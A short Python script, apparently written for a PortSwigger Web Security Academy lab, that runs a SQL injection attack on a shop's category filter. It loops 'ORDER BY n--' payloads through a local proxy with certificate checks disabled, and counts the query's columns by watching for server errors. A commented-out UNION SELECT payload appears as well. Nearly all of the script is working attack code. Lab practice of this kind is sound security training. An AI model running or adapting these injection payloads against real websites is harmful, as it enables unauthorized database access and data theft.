import sys
import requests
import urllib3

# to disable the warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# payload1 = "Gifts' UNION SELECT NULL, NULL, NULL--"
def get_col(url):
    for i in range(1, 50):
        payload = f"Accessories'+order+by+{str(i)}--"
        r = requests.get(url + payload, verify=False, proxies=proxies)
        if "Internal Server Error" in r.text:
            return i - 1
        i = i + 1
    return False

url = "https://acf71ff41f0e1981c0d21eae003c00b8.web-security-academy.net/filter?category="

col = get_col(url)
print("getting cols..")
if col:
    print('[.] Sql injection successful')
    print(f'[.] no of cols {col}')
else:
    print('[*] Unsuccessful')


